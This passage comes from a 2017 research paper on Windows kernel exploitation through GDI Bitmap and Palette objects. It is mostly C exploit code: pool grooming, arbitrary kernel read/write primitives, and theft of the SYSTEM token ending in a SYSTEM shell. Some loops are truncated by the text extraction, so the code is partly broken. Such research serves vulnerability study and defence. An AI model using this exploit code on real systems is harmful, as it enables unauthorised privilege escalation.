1. The extended Bitmap object can be used as a Manager, to overwrite the pvScan0 member of 
an adjacent Bitmap object, and use the second one as Worker. 
2. The extended Bitmap object can be used as a Manager, to overwrite an adjacent Palette object 
(XEPALOBJ) *pFirstColor member, and use the Palette as a Worker. 
3. Demo the full new Palette object technique, using the extended Bitmap object to overwrite 
the cEntries member of an adjacent Palette object, gaining relative memory read/write then 
use the modified Palette object as Manager, to control the *pFirstColor member of a second 
Palette and use the Second Palette as Worker. 
I decided to go with the last option, to take it as a chance to demo the new technique. To achieve 
this, it is necessary to to perform the kernel Pool Feng Shui as explained below. 
Kernel Pool Feng Shui 
The first allocations will be of a bitmap of allocation size 0xFE8, since we know the vulnerable object 
will have the size of 0x10+0x8 (POOL_HEADER), so we create 2000 allocations. 
0x1000 – 0x18 = 0xFE8 
for (int y = 0; y palNumEntries = 0x1E3; 
lPalette->palVersion = 0x0300; 
// for allocations bigger than 0x98 its Gh08 for less its always 0x98 and 
// the tag is Gla18 
for (int k = 0; k  0x6F8 - 1) { 
hManager = bitmaps[i]; 
printf("[*] Manager Bitmap: %d\r\n", i); 
break; 
} 
} 
!
!
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!61!
!
Abusing Palette GDI Objects 
Once the Bitmap object is found, this Bitmap will be used to set the cEntries member of the adjacent 
Palette(XEPALOBJ) object to 0xFFFFFFFF, which is located at offset 0x6B8 of the bitmap bits. 
// BYTE *bytes = (BYTE*)&cEntries; 
for (int y = 0; y  0x3BB) { 
printf("[*] Manager XEPALOBJ Object Handle: 0x%x\r\n", hp[k]); 
hpManager = hp[k]; 
break; 
} 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!62!
!
} 
Once the extended Palette Object is found we will save its handle to use it as the Manager, and set 
the next Palette Object *pFirstColor, which is at offset 0x3FE from Manager Palette object, to the 
address of a fixed Bitmap Object Pool Header. 
UINT wAddress = rPalette[0x3FE]; 
printf("[*] Worker XEPALOBJ->pFirstColor: 0x%04x.\r\n", wAddress); 
UINT tHeader = pFirstColor - 0x1000; 
tHeader = tHeader & 0xFFFFF000; 
printf("[*] Gh05 Address: 0x%04x.\r\n", tHeader); 
SetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)&tHeader); 
As seen above, the Worker *pFirstColor member was successfully set to the fixed Bitmap object Pool 
header, which means that arbitrary memory read/write was achieved. The next step is to identify the 
Worker Palette object handle, we know that the fixed Bitmap object least significant byte of the 
POOL_HEADER will be 0x35 = 5d, since Gh15 translates to 0x35316847, to identify the Worker 
Palette Object, a loop will iterate over the allocated Palettes calling GetPaletteEntries, until a Palette 
is found that has first entry’s least significant byte = 0x35, and save its handle which is going to be our 
Worker Palette object. 
UINT wBuffer[2]; 
for (int x = 0; x > 24 == 0x35) { 
hpWorker = hp[x]; 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!63!
!
printf("[*] Worker XEPALOBJ object Handle: 0x%x\r\n", 
hpWorker); 
printf("[*] wBuffer: %x\r\n", wBuffer[1]); 
break; 
} 
} 
The arbitrary memory read/write will be used to fix the clobbered Bitmap object header. 
VersionSpecificConfig gConfig = { 0x0b4 , 0x0f8 }; 
void SetAddress(UINT* address) { 
SetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, 
(PALETTEENTRY*)address); 
} 
void WriteToAddress(UINT* data, DWORD len) { 
SetPaletteEntries((HPALETTE)hpWorker, 0, len, (PALETTEENTRY*)data); 
} 
UINT ReadFromAddress(UINT src, UINT* dst, DWORD len) { 
SetAddress((UINT *)&src); 
DWORD res = GetPaletteEntries((HPALETTE)hpWorker, 0, len, 
(LPPALETTEENTRY)dst); 
return res; 
} 
Steal Token 32-bit 
With arbitrary kernel memory read/write and all headers fixed, we can now get the kernel pointer to 
a SYSTEM process _EPROCESS structure, and copy and replace the SecurityToken of the current 
process as explained in a previous section. 
// get System EPROCESS 
UINT SystemEPROCESS = PsInitialSystemProcess(); 
//fprintf(stdout, "\r\n%x\r\n", SystemEPROCESS); 
UINT CurrentEPROCESS = PsGetCurrentProcess(); 
//fprintf(stdout, "\r\n%x\r\n", CurrentEPROCESS); 
UINT SystemToken = 0; 
// read token from system process 
ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, &SystemToken, 1); 
fprintf(stdout, "[*] Got System Token: %x\r\n", SystemToken); 
// write token to current process 
UINT CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset; 
SetAddress(&CurProccessAddr); 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!64!
!
SYSTEM!! 
Now the current process has a SYSTEM level token, and will continue execution as SYSTEM, calling 
cmd.exe will drop into a SYSTEM shell. 
system("cmd.exe"); 
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!65!
!
!
Demystifying Kernel Exploitation by 
Abusing GDI Objects 2017-07-18!
!
! !
!
pg.!66!
!
References 
[1] POOL_TYPES: https://msdn.microsoft.com/en-
us/library/windows/hardware/ff559707(v=vs.85).aspx  
[2] Tarjei Mandt – Kernel Pool: https://www.slideshare.net/hackitoergosum/hes2011-tarjei-mandt-
kernel-pool-exploitation-on-windows-7  
[3] Windows Kernel Exploitation: This Time Font hunt you down in 4 bytes – Keen Team: 
http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-
in-4-bytes 
[4] Abusing GDI object for ring0 exploit primitives Reloaded: 
https://www.coresecurity.com/blog/ms16-039-windows-10-64-bits-integer-overflow-exploitation-by-
using-gdi-objects2  
[5] MSDN SURFOBJ: https://msdn.microsoft.com/en-us/library/ee489862.aspx  
[6] ReactOS x86 SURFOBJ: https://www.reactos.org/wiki/Techwiki:Win32k/SURFACE  
[7] https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives  
[8] ReactOS x86 Palette object: https://www.reactos.org/wiki/Techwiki:Win32k/PALETTE  
[9] GDIOBjDump: https://github.com/CoreSecurity/GDIObjDump  
[10] 360Vulcan team Win32k Dark Composition: https://www.slideshare.net/CanSecWest/csw2017-
peng-qiushefangzhong-win32k-darkcompositionfinnalfinnalrmmark  
[11] UlongMult: ] https://msdn.microsoft.com/en-
us/library/windows/desktop/bb776657(v=vs.85).aspx  
[12] Using Paths Example: https://msdn.microsoft.com/en-
us/library/windows/desktop/dd145181(v=vs.85).aspx  
[13] Device Context Types: https://msdn.microsoft.com/en-
us/library/windows/desktop/dd183560(v=vs.85).aspx 
[14] Nicolas Economou blog post: https://www.coresecurity.com/blog/ms16-039-windows-10-64-
bits-integer-overflow-exploitation-by-using-gdi-objects  
[15] Diego Juarez Abusing GDI Objects for ring0 Exploit Primitives: 
https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives